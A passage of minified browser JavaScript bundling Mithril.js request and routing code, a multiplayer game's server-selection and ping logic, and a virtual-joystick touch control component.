        , p = u.indexOf("?")
        , h = u.indexOf("#")
        , m = h < 0 ? u.length : h
        , w = p < 0 ? m : p
        , v = u.slice(0, w);
        n >= 0 && (v += i.slice(n, o)),
            p >= 0 && (v += (n < 0 ? "?" : "&") + u.slice(p, m));
        var x = e(a);
        return x && (v += (n < 0 && p < 0 ? "?" : "&") + x),
            r >= 0 && (v += i.slice(r)),
            h >= 0 && (v += (r < 0 ? "" : "&") + u.slice(h)),
            v
    }
        ,
        an
}
var sh = rs(), Gs = Ci, rh = function(e, t, i) {
    var s = 0;
    function n(l) {
        return new t(l)
    }
    n.prototype = t.prototype,
        n.__proto__ = t;
    function r(l) {
        return function(c, a) {
            typeof c != "string" ? (a = c,
                                    c = c.url) : a == null && (a = {});
            var u = new t(function(w, v) {
                l(sh(c, a.params), a, function(x) {
                    if (typeof a.type == "function")
                        if (Array.isArray(x))
                            for (var D = 0; D < x.length; D++)
                                x[D] = new a.type(x[D]);
                        else
                            x = new a.type(x);
                    w(x)
                }, v)
            }
                         );
            if (a.background === !0)
                return u;
            var p = 0;
            function h() {
                --p === 0 && typeof i == "function" && i()
            }
            return m(u);
            function m(w) {
                var v = w.then;
                return w.constructor = n,
                    w.then = function() {
                    p++;
                    var x = v.apply(w, arguments);
                    return x.then(h, function(D) {
                        if (h(),
                            p === 0)
                            throw D
                    }),
                        m(x)
                }
                    ,
                    w
            }
        }
    }
    function o(l, c) {
        for (var a in l.headers)
            if (Gs.call(l.headers, a) && a.toLowerCase() === c)
                return !0;
        return !1
    }
    return {
        request: r(function(l, c, a, u) {
            var p = c.method != null ? c.method.toUpperCase() : "GET", h = c.body, m = (c.serialize == null || c.serialize === JSON.serialize) && !(h instanceof e.FormData || h instanceof e.URLSearchParams), w = c.responseType || (typeof c.extract == "function" ? "" : "json"), v = new e.XMLHttpRequest, x = !1, D = !1, k = v, S, O = v.abort;
            v.abort = function() {
                x = !0,
                    O.call(this)
            }
                ,
                v.open(p, l, c.async !== !1, typeof c.user == "string" ? c.user : void 0, typeof c.password == "string" ? c.password : void 0),
                m && h != null && !o(c, "content-type") && v.setRequestHeader("Content-Type", "application/json; charset=utf-8"),
                typeof c.deserialize != "function" && !o(c, "accept") && v.setRequestHeader("Accept", "application/json, text/*"),
                c.withCredentials && (v.withCredentials = c.withCredentials),
                c.timeout && (v.timeout = c.timeout),
                v.responseType = w;
            for (var U in c.headers)
                Gs.call(c.headers, U) && v.setRequestHeader(U, c.headers[U]);
            v.onreadystatechange = function(L) {
                if (!x && L.target.readyState === 4)
                    try {
                        var q = L.target.status >= 200 && L.target.status < 300 || L.target.status === 304 || /^file:\/\//i.test(l), P = L.target.response, W;
                        if (w === "json") {
                            if (!L.target.responseType && typeof c.extract != "function")
                                try {
                                    P = JSONParse(L.target.responseText)
                                } catch {
                                    P = null
                                }
                        } else
                            (!w || w === "text") && P == null && (P = L.target.responseText);
                        if (typeof c.extract == "function" ? (P = c.extract(L.target, c),
                                                              q = !0) : typeof c.deserialize == "function" && (P = c.deserialize(P)),
                            q)
                            a(P);
                        else {
                            var F = function() {
                                try {
                                    W = L.target.responseText
                                } catch {
                                    W = P
                                }
                                var _ = new Error(W);
                                _.code = L.target.status,
                                    _.response = P,
                                    u(_)
                            };
                            v.status === 0 ? setTimeout(function() {
                                D || F()
                            }) : F()
                        }
                    } catch (_) {
                        u(_)
                    }
            }
                ,
                v.ontimeout = function(L) {
                D = !0;
                var q = new Error("Request timed out");
                q.code = L.target.status,
                    u(q)
            }
                ,
                typeof c.config == "function" && (v = c.config(v, c, l) || v,
                                                  v !== k && (S = v.abort,
                                                              v.abort = function() {
                x = !0,
                    S.call(this)
            }
                                                             )),
                h == null ? v.send() : typeof c.serialize == "function" ? v.send(c.serialize(h)) : h instanceof e.FormData || h instanceof e.URLSearchParams ? v.send(h) : v.send(JSONStringify(h))
        }),
        jsonp: r(function(l, c, a, u) {
            var p = c.callbackName || "_mithril_" + round(Math.random() * 1e16) + "_" + s++
            , h = e.document.createElement("script");
            e[p] = function(m) {
                delete e[p],
                    h.parentNode.removeChild(h),
                    a(m)
            }
                ,
                h.onerror = function() {
                delete e[p],
                    h.parentNode.removeChild(h),
                    u(new Error("JSONP request failed"))
            }
                ,
                h.src = l + (l.indexOf("?") < 0 ? "?" : "&") + encodeURIComponent(c.callbackKey || "callback") + "=" + encodeURIComponent(p),
                e.document.documentElement.appendChild(h)
        })
    }
}, oh = yi, ah = ss, lh = rh(typeof window < "u" ? window : null, oh, ah.redraw), ln, Ys;
function no() {
    if (Ys)
        return ln;
    Ys = 1;
    function e(t) {
        try {
            return decodeURIComponent(t)
        } catch {
            return t
        }
    }
    return ln = function(t) {
        if (t === "" || t == null)
            return {};
        t.charAt(0) === "?" && (t = t.slice(1));
        for (var i = t.split("&"), s = {}, n = {}, r = 0; r < i.length; r++) {
            var o = i[r].split("=")
            , l = e(o[0])
            , c = o.length === 2 ? e(o[1]) : "";
            c === "true" ? c = !0 : c === "false" && (c = !1);
            var a = l.split(/\]\[?|\[/)
            , u = n;
            l.indexOf("[") > -1 && a.pop();
            for (var p = 0; p < a.length; p++) {
                var h = a[p]
                , m = a[p + 1]
                , w = m == "" || !isNaN(parseInt(m, 10));
                if (h === "") {
                    var l = a.slice(0, p).join();
                    s[l] == null && (s[l] = Array.isArray(u) ? u.length : 0),
                        h = s[l]++
                } else if (h === "__proto__")
                    break;
                if (p === a.length - 1)
                    u[h] = c;
                else {
                    var v = Object.getOwnPropertyDescriptor(u, h);
                    v != null && (v = v.value),
                        v == null && (u[h] = v = w ? [] : {}),
                        u = v
                }
            }
        }
        return n
    }
        ,
        ln
}
var cn, $s;
function os() {
    if ($s)
        return cn;
    $s = 1;
    var e = no();
    return cn = function(t) {
        var i = t.indexOf("?")
        , s = t.indexOf("#")
        , n = s < 0 ? t.length : s
        , r = i < 0 ? n : i
        , o = t.slice(0, r).replace(/\/{2,}/g, "/");
        return o ? (o[0] !== "/" && (o = "/" + o),
                    o.length > 1 && o[o.length - 1] === "/" && (o = o.slice(0, -1))) : o = "/",
            {
            path: o,
            params: i < 0 ? {} : e(t.slice(i + 1, n))
        }
    }
        ,
        cn
}
var hn, Ks;
function ch() {
    if (Ks)
        return hn;
    Ks = 1;
    var e = os();
    return hn = function(t) {
        var i = e(t)
        , s = Object.keys(i.params)
        , n = []
        , r = new RegExp("^" + i.path.replace(/:([^\/.-]+)(\.{3}|\.(?!\.)|-)?|[\\^$*+.()|\[\]{}]/g, function(o, l, c) {
            return l == null ? "\\" + o : (n.push({
                k: l,
                r: c === "..."
            }),
                                           c === "..." ? "(.*)" : c === "." ? "([^/]+)\\." : "([^/]+)" + (c || ""))
        }) + "$");
        return function(o) {
            for (var l = 0; l < s.length; l++)
                if (i.params[s[l]] !== o.params[s[l]])
                    return !1;
            if (!n.length)
                return r.test(o.path);
            var c = r.exec(o.path);
            if (c == null)
                return !1;
            for (var l = 0; l < n.length; l++)
                o.params[n[l].k] = n[l].r ? c[l + 1] : decodeURIComponent(c[l + 1]);
            return !0
        }
    }
        ,
        hn
}
var fn, Js;
function so() {
    if (Js)
        return fn;
    Js = 1;
    var e = Ci
    , t = new RegExp("^(?:key|oninit|oncreate|onbeforeupdate|onupdate|onbeforeremove|onremove)$");
    return fn = function(i, s) {
        var n = {};
        if (s != null)
            for (var r in i)
                e.call(i, r) && !t.test(r) && s.indexOf(r) < 0 && (n[r] = i[r]);
        else
            for (var r in i)
                e.call(i, r) && !t.test(r) && (n[r] = i[r]);
        return n
    }
        ,
        fn
}
var un, Qs;
function hh() {
    if (Qs)
        return un;
    Qs = 1;
    var e = Ge()
    , t = Zr
    , i = yi
    , s = rs()
    , n = os()
    , r = ch()
    , o = io()
    , l = so()
    , c = {};
    function a(u) {
        try {
            return decodeURIComponent(u)
        } catch {
            return u
        }
    }
    return un = function(u, p) {
        var h = u == null ? null : typeof u.setImmediate == "function" ? u.setImmediate : u.setTimeout, m = i.resolve(), w = !1, v = !1, x = 0, D, k, S = c, O, U, L, q, P = {
            onbeforeupdate: function() {
                return x = x ? 2 : 1,
                    !(!x || c === S)
            },
            onremove: function() {
                u.removeEventListener("popstate", _, !1),
                    u.removeEventListener("hashchange", F, !1)
            },
            view: function() {
                if (!(!x || c === S)) {
                    var z = [e(O, U.key, U)];
                    return S && (z = S.render(z[0])),
                        z
                }
            }
        }, W = V.SKIP = {};
        function F() {
            w = !1;
            var z = u.location.hash;
            V.prefix[0] !== "#" && (z = u.location.search + z,
                                    V.prefix[0] !== "?" && (z = u.location.pathname + z,
                                                            z[0] !== "/" && (z = "/" + z)));
            var X = z.concat().replace(/(?:%[a-f89][a-f0-9])+/gim, a).slice(V.prefix.length)
            , G = n(X);
            o(G.params, u.history.state);
            function te(K) {
                console.error(K),
                    $(k, null, {
                    replace: !0
                })
            }
            ie(0);
            function ie(K) {
                for (; K < D.length; K++)
                    if (D[K].check(G)) {
                        var ke = D[K].component
                        , nt = D[K].route
                        , Bi = ke
                        , Ue = q = function(Ye) {
                            if (Ue === q) {
                                if (Ye === W)
                                    return ie(K + 1);
                                O = Ye != null && (typeof Ye.view == "function" || typeof Ye == "function") ? Ye : "div",
                                    U = G.params,
                                    L = X,
                                    q = null,
                                    S = ke.render ? ke : null,
                                    x === 2 ? p.redraw() : (x = 2,
                                                            p.redraw.sync())
                            }
                        }
                        ;
                        ke.view || typeof ke == "function" ? (ke = {},
                                                              Ue(Bi)) : ke.onmatch ? m.then(function() {
                            return ke.onmatch(G.params, X, nt)
                        }).then(Ue, X === k ? null : te) : Ue("div");
                        return
                    }
                if (X === k)
                    throw new Error("Could not resolve default route " + k + ".");
                $(k, null, {
                    replace: !0
                })
            }
        }
        function _() {
            w || (w = !0,
                  h(F))
        }
        function $(z, X, G) {
            if (z = s(z, X),
                v) {
                _();
                var te = G ? G.state : null
                , ie = G ? G.title : null;
                G && G.replace ? u.history.replaceState(te, ie, V.prefix + z) : u.history.pushState(te, ie, V.prefix + z)
            } else
                u.location.href = V.prefix + z
        }
        function V(z, X, G) {
            if (!z)
                throw new TypeError("DOM element being rendered to does not exist.");
            if (D = Object.keys(G).map(function(ie) {
                if (ie[0] !== "/")
                    throw new SyntaxError("Routes must start with a '/'.");
                if (/:([^\/\.-]+)(\.{3})?:/.test(ie))
                    throw new SyntaxError("Route parameter names must be separated with either '/', '.', or '-'.");
                return {
                    route: ie,
                    component: G[ie],
                    check: r(ie)
                }
            }),
                k = X,
                X != null) {
                var te = n(X);
                if (!D.some(function(ie) {
                    return ie.check(te)
                }))
                    throw new ReferenceError("Default route doesn't match any known routes.")
            }
            typeof u.history.pushState == "function" ? u.addEventListener("popstate", _, !1) : V.prefix[0] === "#" && u.addEventListener("hashchange", F, !1),
                v = !0,
                p.mount(z, P),
                F()
        }
        return V.set = function(z, X, G) {
            q != null && (G = G || {},
                          G.replace = !0),
                q = null,
                $(z, X, G)
        }
            ,
            V.get = function() {
            return L
        }
            ,
            V.prefix = "#!",
            V.Link = {
            view: function(z) {
                var X = t(z.attrs.selector || "a", l(z.attrs, ["options", "params", "selector", "onclick"]), z.children), G, te, ie;
                return (X.attrs.disabled = Boolean(X.attrs.disabled)) ? (X.attrs.href = null,
                                                                         X.attrs["aria-disabled"] = "true") : (G = z.attrs.options,
                                                                                                               te = z.attrs.onclick,
                                                                                                               ie = s(X.attrs.href, z.attrs.params),
                                                                                                               X.attrs.href = V.prefix + ie,
                                                                                                               X.attrs.onclick = function(K) {
                    var ke;
                    typeof te == "function" ? ke = te.call(K.currentTarget, K) : te == null || typeof te != "object" || typeof te.handleEvent == "function" && te.handleEvent(K),
                        ke !== !1 && !K.defaultPrevented && (K.button === 0 || K.which === 0 || K.which === 1) && (!K.currentTarget.target || K.currentTarget.target === "_self") && !K.ctrlKey && !K.metaKey && !K.shiftKey && !K.altKey && (K.preventDefault(),
                    K.redraw = !1,
                    V.set(ie, null, G))
                }
                                                                                                              ),
                    X
            }
        },
            V.param = function(z) {
            return U && z != null ? U[z] : U
        }
            ,
            V
    }
        ,
        un
}
var dn, Zs;
function fh() {
    if (Zs)
        return dn;
    Zs = 1;
    var e = ss;
    return dn = hh()(typeof window < "u" ? window : null, e),
        dn
}
var Ai = eh
, ro = lh
, oo = ss
, pe = function() {
    return Ai.apply(this, arguments)
};
pe.m = Ai;
pe.trust = Ai.trust;
pe.fragment = Ai.fragment;
pe.Fragment = "[";
pe.mount = oo.mount;
pe.route = fh();
pe.render = eo();
pe.redraw = oo.redraw;
pe.request = ro.request;
pe.jsonp = ro.jsonp;
pe.parseQueryString = no();
pe.buildQueryString = to();
pe.parsePathname = os();
pe.buildPathname = rs();
pe.vnode = Ge();
pe.PromisePolyfill = jr();
pe.censor = so();
var Ne = pe;
function we(e, t, i, s, n) {
    this.debugLog = !1,
        this.baseUrl = e,
        this.lobbySize = i,
        this.devPort = t,
        this.lobbySpread = s,
        this.rawIPs = !!n,
        this.server = void 0,
        this.gameIndex = void 0,
        this.callback = void 0,
        this.errorCallback = void 0
}
we.prototype.regionInfo = {
    0: {
        name: "Local",
        latitude: 0,
        longitude: 0
    },
    "us-east": {
        name: "Miami",
        latitude: 40.1393329,
        longitude: -75.8521818
    },
    miami: {
        name: "Miami",
        latitude: 40.1393329,
        longitude: -75.8521818
    },
    "us-west": {
        name: "Silicon Valley",
        latitude: 47.6149942,
        longitude: -122.4759879
    },
    siliconvalley: {
        name: "Silicon Valley",
        latitude: 47.6149942,
        longitude: -122.4759879
    },
    gb: {
        name: "London",
        latitude: 51.5283063,
        longitude: -.382486
    },
    london: {
        name: "London",
        latitude: 51.5283063,
        longitude: -.382486
    },
    "eu-west": {
        name: "Frankfurt",
        latitude: 50.1211273,
        longitude: 8.496137
    },
    frankfurt: {
        name: "Frankfurt",
        latitude: 50.1211273,
        longitude: 8.496137
    },
    au: {
        name: "Sydney",
        latitude: -33.8479715,
        longitude: 150.651084
    },
    sydney: {
        name: "Sydney",
        latitude: -33.8479715,
        longitude: 150.651084
    },
    saopaulo: {
        name: "São Paulo",
        latitude: 23.5558,
        longitude: 46.6396
    },
    sg: {
        name: "Singapore",
        latitude: 1.3147268,
        longitude: 103.7065876
    },
    singapore: {
        name: "Singapore",
        latitude: 1.3147268,
        longitude: 103.7065876
    }
};
we.prototype.start = function(e, t, i, s) {
    if (this.callback = t,
        this.errorCallback = i,
        s)
        return t();
    const n = this.parseServerQuery(e);
    n && n.length > 0 ? (this.log("Found server in query."),
                         this.password = n[3],
                         this.connect(n[0], n[1], n[2])) : this.errorCallback("Unable to find server")
}
;
we.prototype.parseServerQuery = function(e) {
    const t = new URLSearchParams(location.search,!0)
    , i = e || t.get("server");
    if (typeof i != "string")
        return [];
    const [s,n] = i.split(":");
    return [s, n, t.get("password")]
}
;
we.prototype.findServer = function(e, t) {
    var i = this.servers[e];
    for (let s = 0; s < i.length; s++) {
        const n = i[s];
        if (n.name === t)
            return n
    }
    console.warn("Could not find server in region " + e + " with serverName " + t + ".")
}
;
we.prototype.seekServer = function(e, t, i) {
    i == null && (i = "random"),
        t == null && (t = !1);
    const s = ["random"]
    , n = this.lobbySize
    , r = this.lobbySpread
    , o = this.servers[e].flatMap(function(h) {
        let m = 0;
        return h.games.map(function(w) {
            const v = m++;
            return {
                region: h.region,
                index: h.index * h.games.length + v,
                gameIndex: v,
                gameCount: h.games.length,
                playerCount: w.playerCount,
                playerCapacity: 50,
                isPrivate: w.isPrivate
            }
        })
    }).filter(function(h) {
        return !h.isPrivate
    }).filter(function(h) {
        return t ? h.playerCount == 0 && h.gameIndex >= h.gameCount / 2 : !0
    }).filter(function(h) {
        return i == "random" ? !0 : s[h.index % s.length].key == i
    }).sort(function(h, m) {
        return m.playerCount - h.playerCount
    }).filter(function(h) {
        return h.playerCount < n
    });
    if (t && o.reverse(),
        o.length == 0) {
        this.errorCallback("No open servers.");
        return
    }
    const l = min(r, o.length);
    var u = floor(Math.random() * l);
    u = min(u, o.length - 1);
    const c = o[u]
    , a = c.region;
    var u = floor(c.index / c.gameCount);
    const p = c.index % c.gameCount;
    return this.log("Found server."),
        [a, u, p]
}
;
we.prototype.connect = function(e, t, i) {
    if (this.connected)
        return;
    const s = this.findServer(e, t);
    if (s == null) {
        this.errorCallback("Failed to find server for region " + e + " and serverName " + t);
        return
    }
    // if (this.log("Connecting to server", s, "with game index", i),
    //     s.playerCount >= 50) {
    //     this.errorCallback("Server is already full.");
    //     return
    // }
    window.history.replaceState(document.title, document.title, this.generateHref(e, t, this.password)),
        this.server = s,
        this.gameIndex = i,
        this.log("Calling callback with address", this.serverAddress(s), "on port", this.serverPort(s)),
        this.callback(this.serverAddress(s), this.serverPort(s), i),
        Lt && clearInterval(Lt)
}
;
we.prototype.switchServer = function(e, t) {
    this.switchingServers = !0,
        window.location = this.generateHref(e, t, null)
}
;
we.prototype.generateHref = function(e, t, i) {
    let s = window.location.href.split("?")[0];
    return s += "?server=" + e + ":" + t,
        i && (s += "&password=" + encodeURIComponent(i)),
        s
}
;
we.prototype.serverAddress = function(e) {
    return e.region == 0 ? "localhost" : e.key + "." + e.region + "." + this.baseUrl
}
;
we.prototype.serverPort = function(e) {
    return e.port
}
;
let Lt;
function uh(e) {
    e = e.filter(n=>n.playerCount !== 50);
    const t = min(...e.map(n=>n.ping || 1 / 0))
    , i = e.filter(n=>n.ping === t);
    return !i.length > 0 ? null : i.reduce((n,r)=>n.playerCount > r.playerCount ? n : r)
}
we.prototype.processServers = function(e) {
    return Lt && clearInterval(Lt),
        new Promise(t=>{
        const i = {}
        , s = c=>{
            const a = i[c]
            , u = a[0];
            let p = this.serverAddress(u);
            const h = this.serverPort(u);
            h && (p += `:${h}`);
            const m = `https://${p}/ping`
            , w = new Date().getTime();
            return Promise.race([fetch(m).then(()=>{
                const v = new Date().getTime() - w;
                a.forEach(x=>{
                    x.pings = x.pings ?? [],
                        x.pings.push(v),
                        x.pings.length > 10 && x.pings.shift(),
                        x.ping = floor(x.pings.reduce((D,k)=>D + k, 0) / x.pings.length)
                }
                         )
            }
                                              ).catch(()=>{}
                                                     ), new Promise(v=>setTimeout(()=>v(), 100))])
        }
        , n = async()=>{
            await Promise.all(Object.keys(i).map(s)),
                window.blockRedraw || Ne.redraw()
        }
        ;
        e.forEach(c=>{
            i[c.region] = i[c.region] || [],
                i[c.region].push(c)
        }
                 );
        for (const c in i)
            i[c] = i[c].sort(function(a, u) {
                return u.playerCount - a.playerCount
            });
        this.servers = i;
        let r;
        const [o,l] = this.parseServerQuery();
        e.forEach(c=>{
            o === c.region && l === c.name && (c.selected = !0,
                                               r = c)
        }
                 ),
            n().then(n).then(()=>{
            if (r)
                return;
            let c = uh(e);
            c || (c = e[0]),
                c && (c.selected = !0,
                      window.history.replaceState(document.title, document.title, this.generateHref(c.region, c.name, this.password))),
                window.blockRedraw || Ne.redraw()
        }
                            ).then(n).catch(c=>{}
                                           ).finally(t),
            Lt = setInterval(n, 5e3)
    }
                   )
}
;
we.prototype.ipToHex = function(e) {
    return e.split(".").map(i=>("00" + parseInt(i).toString(16)).substr(-2)).join("").toLowerCase()
}
;
we.prototype.hashIP = function(e) {
    return On(this.ipToHex(e))
}
;
we.prototype.log = function() {
    if (this.debugLog)
        return console.log.apply(void 0, arguments);
    if (console.verbose)
        return console.verbose.apply(void 0, arguments)
}
;
we.prototype.stripRegion = function(e) {
    return e.startsWith("vultr:") ? e = e.slice(6) : e.startsWith("do:") && (e = e.slice(3)),
        e
}
;
const dh = function(e, t) {
    return e.concat(t)
}
, ph = function(e, t) {
    return t.map(e).reduce(dh, [])
};
Array.prototype.flatMap = function(e) {
    return ph(e, this)
}
;
const fi = (e,t)=>{
    const i = t.x - e.x
    , s = t.y - e.y;
    return sqrt(i * i + s * s)
}
, mh = (e,t)=>{
    const i = t.x - e.x
    , s = t.y - e.y;
    return yh(atan2(s, i))
}
, gh = (e,t,i)=>{
    const s = {
        x: 0,
        y: 0
    };
    return i = Bn(i),
        s.x = e.x - t * cos(i),
        s.y = e.y - t * sin(i),
        s
}
, Bn = e=>e * (PI / 180)
, yh = e=>e * (180 / PI)
, wh = e=>isNaN(e.buttons) ? e.pressure !== 0 : e.buttons !== 0
, pn = new Map
, js = e=>{
    pn.has(e) && clearTimeout(pn.get(e)),
        pn.set(e, setTimeout(e, 100))
}
, wi = (e,t,i)=>{
    const s = t.split(/[ ,]+/g);
    let n;
    for (let r = 0; r < s.length; r += 1)
        n = s[r],
            e.addEventListener ? e.addEventListener(n, i, !1) : e.attachEvent && e.attachEvent(n, i)
}
, er = (e,t,i)=>{
    const s = t.split(/[ ,]+/g);
    let n;
    for (let r = 0; r < s.length; r += 1)
        n = s[r],
            e.removeEventListener ? e.removeEventListener(n, i) : e.detachEvent && e.detachEvent(n, i)
}
, ao = e=>(e.preventDefault(),
           e.type.match(/^touch/) ? e.changedTouches : e)
, tr = ()=>{
    const e = window.pageXOffset !== void 0 ? window.pageXOffset : (document.documentElement || document.body.parentNode || document.body).scrollLeft
    , t = window.pageYOffset !== void 0 ? window.pageYOffset : (document.documentElement || document.body.parentNode || document.body).scrollTop;
    return {
        x: e,
        y: t
    }
}
, ir = (e,t)=>{
    t.top || t.right || t.bottom || t.left ? (e.style.top = t.top,
                                              e.style.right = t.right,
                                              e.style.bottom = t.bottom,
                                              e.style.left = t.left) : (e.style.left = t.x + "px",
                                                                        e.style.top = t.y + "px")
}
, as = (e,t,i)=>{
    const s = lo(e);
    for (let n in s)
        if (s.hasOwnProperty(n))
            if (typeof t == "string")
                s[n] = t + " " + i;
            else {
                let r = "";
                for (let o = 0, l = t.length; o < l; o += 1)
                    r += t[o] + " " + i + ", ";
                s[n] = r.slice(0, -2)
            }
    return s
}
, kh = (e,t)=>{
    const i = lo(e);
    for (let s in i)
        i.hasOwnProperty(s) && (i[s] = t);
    return i
}
, lo = e=>{
    const t = {};
    return t[e] = "",
        ["webkit", "Moz", "o"].forEach(function(s) {
        t[s + e.charAt(0).toUpperCase() + e.slice(1)] = ""
    }),
        t
}
, mn = (e,t)=>{
    for (let i in t)
        t.hasOwnProperty(i) && (e[i] = t[i]);
    return e
}
, vh = (e,t)=>{
    const i = {};
    for (let s in e)
        e.hasOwnProperty(s) && t.hasOwnProperty(s) ? i[s] = t[s] : e.hasOwnProperty(s) && (i[s] = e[s]);
    return i
}
, zn = (e,t)=>{
    if (e.length)
        for (let i = 0, s = e.length; i < s; i += 1)
            t(e[i]);
    else
        t(e)
}
, xh = (e,t,i)=>({
    x: min(max(e.x, t.x - i), t.x + i),
    y: min(max(e.y, t.y - i), t.y + i)
});
var bh = "ontouchstart"in window, Sh = !!window.PointerEvent, Th = !!window.MSPointerEvent, Bt = {
    touch: {
        start: "touchstart",
        move: "touchmove",
        end: "touchend, touchcancel"
    },
    mouse: {
        start: "mousedown",
        move: "mousemove",
        end: "mouseup"
    },
    pointer: {
        start: "pointerdown",
        move: "pointermove",
        end: "pointerup, pointercancel"
    },
    MSPointer: {
        start: "MSPointerDown",
        move: "MSPointerMove",
        end: "MSPointerUp"
    }
}, vt, Kt = {};
Sh ? vt = Bt.pointer : Th ? vt = Bt.MSPointer : bh ? (vt = Bt.touch,
                                                      Kt = Bt.mouse) : vt = Bt.mouse;
function Ve() {}
Ve.prototype.on = function(e, t) {
    var i = this, s = e.split(/[ ,]+/g), n;
    i._handlers_ = i._handlers_ || {};
    for (var r = 0; r < s.length; r += 1)
        n = s[r],
            i._handlers_[n] = i._handlers_[n] || [],
            i._handlers_[n].push(t);
    return i
}
;
Ve.prototype.off = function(e, t) {
    var i = this;
    return i._handlers_ = i._handlers_ || {},
        e === void 0 ? i._handlers_ = {} : t === void 0 ? i._handlers_[e] = null : i._handlers_[e] && i._handlers_[e].indexOf(t) >= 0 && i._handlers_[e].splice(i._handlers_[e].indexOf(t), 1),
        i
}
;
Ve.prototype.trigger = function(e, t) {
    var i = this, s = e.split(/[ ,]+/g), n;
    i._handlers_ = i._handlers_ || {};
    for (var r = 0; r < s.length; r += 1)
        n = s[r],
            i._handlers_[n] && i._handlers_[n].length && i._handlers_[n].forEach(function(o) {
            o.call(i, {
                type: n,
                target: i
            }, t)
        })
}
;
Ve.prototype.config = function(e) {
    var t = this;
    t.options = t.defaults || {},
        e && (t.options = vh(t.options, e))
}
;
Ve.prototype.bindEvt = function(e, t) {
    var i = this;
    return i._domHandlers_ = i._domHandlers_ || {},
        i._domHandlers_[t] = function() {
        typeof i["on" + t] == "function" ? i["on" + t].apply(i, arguments) : console.warn('[WARNING] : Missing "on' + t + '" handler.')
    }
        ,
        wi(e, vt[t], i._domHandlers_[t]),
        Kt[t] && wi(e, Kt[t], i._domHandlers_[t]),
        i
}
;
Ve.prototype.unbindEvt = function(e, t) {
    var i = this;
    return i._domHandlers_ = i._domHandlers_ || {},
        er(e, vt[t], i._domHandlers_[t]),
        Kt[t] && er(e, Kt[t], i._domHandlers_[t]),
        delete i._domHandlers_[t],
        this
}
;
function he(e, t) {
    return this.identifier = t.identifier,
        this.position = t.position,
        this.frontPosition = t.frontPosition,
        this.collection = e,
        this.defaults = {
        size: 100,
        threshold: .1,
        color: "white",
        fadeTime: 250,
        dataOnly: !1,
        restJoystick: !0,
        restOpacity: .5,
        mode: "dynamic",
        zone: document.body,
        lockX: !1,
        lockY: !1,
        shape: "circle"
    },
        this.config(t),
        this.options.mode === "dynamic" && (this.options.restOpacity = 0),
        this.id = he.id,
        he.id += 1,
        this.buildEl().stylize(),
        this.instance = {
        el: this.ui.el,
        on: this.on.bind(this),
        off: this.off.bind(this),
        show: this.show.bind(this),
        hide: this.hide.bind(this),
        add: this.addToDom.bind(this),
        remove: this.removeFromDom.bind(this),
        destroy: this.destroy.bind(this),
        setPosition: this.setPosition.bind(this),
        resetDirection: this.resetDirection.bind(this),
        computeDirection: this.computeDirection.bind(this),
        trigger: this.trigger.bind(this),
        position: this.position,
        frontPosition: this.frontPosition,
        ui: this.ui,
        identifier: this.identifier,
        id: this.id,
        options: this.options
    },
        this.instance
}
he.prototype = new Ve;
he.constructor = he;
he.id = 0;
he.prototype.buildEl = function(e) {
    return this.ui = {},
        this.options.dataOnly ? this : (this.ui.el = document.createElement("div"),
                                        this.ui.back = document.createElement("div"),
                                        this.ui.front = document.createElement("div"),
                                        this.ui.el.className = "nipple collection_" + this.collection.id,
                                        this.ui.back.className = "back",
                                        this.ui.front.className = "front",
                                        this.ui.el.setAttribute("id", "nipple_" + this.collection.id + "_" + this.id),
                                        this.ui.el.appendChild(this.ui.back),
                                        this.ui.el.appendChild(this.ui.front),
                                        this)
}
;
he.prototype.stylize = function() {
    if (this.options.dataOnly)
        return this;
    var e = this.options.fadeTime + "ms"
    , t = kh("borderRadius", "50%")
    , i = as("transition", "opacity", e)
    , s = {};
    return s.el = {
        position: "absolute",
        opacity: this.options.restOpacity,
        display: "block",
        zIndex: 999
    },
        s.back = {
        position: "absolute",
        display: "block",
        width: this.options.size + "px",
        height: this.options.size + "px",
        marginLeft: -this.options.size / 2 + "px",
        marginTop: -this.options.size / 2 + "px",
        background: this.options.color,
        opacity: ".5"
    },
        s.front = {
        width: this.options.size / 2 + "px",
        height: this.options.size / 2 + "px",
        position: "absolute",
        display: "block",
        marginLeft: -this.options.size / 4 + "px",
        marginTop: -this.options.size / 4 + "px",
        background: this.options.color,
        opacity: ".5",
        transform: "translate(0px, 0px)"
    },
        mn(s.el, i),
        this.options.shape === "circle" && mn(s.back, t),
        mn(s.front, t),
        this.applyStyles(s),
        this
}
;
he.prototype.applyStyles = function(e) {
    for (var t in this.ui)
        if (this.ui.hasOwnProperty(t))
            for (var i in e[t])
                this.ui[t].style[i] = e[t][i];
    return this
}
;
he.prototype.addToDom = function() {
    return this.options.dataOnly || document.body.contains(this.ui.el) ? this : (this.options.zone.appendChild(this.ui.el),
                                                                                 this)
}
;
he.prototype.removeFromDom = function() {
    return this.options.dataOnly || !document.body.contains(this.ui.el) ? this : (this.options.zone.removeChild(this.ui.el),
                                                                                  this)
}
;
he.prototype.destroy = function() {
    clearTimeout(this.removeTimeout),
        clearTimeout(this.showTimeout),
        clearTimeout(this.restTimeout),
        this.trigger("destroyed", this.instance),
        this.removeFromDom(),
        this.off()
}
;
he.prototype.show = function(e) {
    var t = this;
    return t.options.dataOnly || (clearTimeout(t.removeTimeout),
                                  clearTimeout(t.showTimeout),
                                  clearTimeout(t.restTimeout),
                                  t.addToDom(),
                                  t.restCallback(),
                                  setTimeout(function() {
        t.ui.el.style.opacity = 1
    }, 0),
                                  t.showTimeout = setTimeout(function() {
        t.trigger("shown", t.instance),
            typeof e == "function" && e.call(this)
    }, t.options.fadeTime)),
        t
}
;
he.prototype.hide = function(e) {
    var t = this;
    if (t.options.dataOnly)
        return t;
    if (t.ui.el.style.opacity = t.options.restOpacity,
        clearTimeout(t.removeTimeout),
        clearTimeout(t.showTimeout),
        clearTimeout(t.restTimeout),
        t.removeTimeout = setTimeout(function() {
        var i = t.options.mode === "dynamic" ? "none" : "block";
        t.ui.el.style.display = i,
            typeof e == "function" && e.call(t),
            t.trigger("hidden", t.instance)
    }, t.options.fadeTime),
        t.options.restJoystick) {
        const i = t.options.restJoystick
        , s = {};
        s.x = i === !0 || i.x !== !1 ? 0 : t.instance.frontPosition.x,
            s.y = i === !0 || i.y !== !1 ? 0 : t.instance.frontPosition.y,
            t.setPosition(e, s)
    }
    return t
}
;
he.prototype.setPosition = function(e, t) {
    var i = this;
    i.frontPosition = {
        x: t.x,
        y: t.y
    };
    var s = i.options.fadeTime + "ms"
    , n = {};
    n.front = as("transition", ["transform"], s);
    var r = {
        front: {}
    };
    r.front = {
        transform: "translate(" + i.frontPosition.x + "px," + i.frontPosition.y + "px)"
    },
        i.applyStyles(n),
        i.applyStyles(r),
